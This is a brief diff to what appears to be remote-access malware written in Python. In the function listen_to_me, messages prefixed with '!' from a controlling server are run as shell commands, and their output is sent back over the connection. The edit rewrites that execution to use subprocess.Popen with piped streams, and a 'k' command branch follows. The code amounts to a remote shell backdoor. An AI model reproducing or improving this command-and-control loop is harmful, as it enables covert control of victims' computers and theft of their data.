@@ -408,8 +408,8 @@ def listen_to_me():
                 for command in messages:
                     if command.startswith("!"):
                         command = command[1:].split(" ")
-                        command_out = subprocess.check_output(command)
-                        command_out = b"$" + command_out + b"$"
+                        command_out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        command_out = b"$" + command_out.stdout.read() + b"$"
                         my_server.sendall(command_out)
                     elif command == "k":
                         # if not stream:
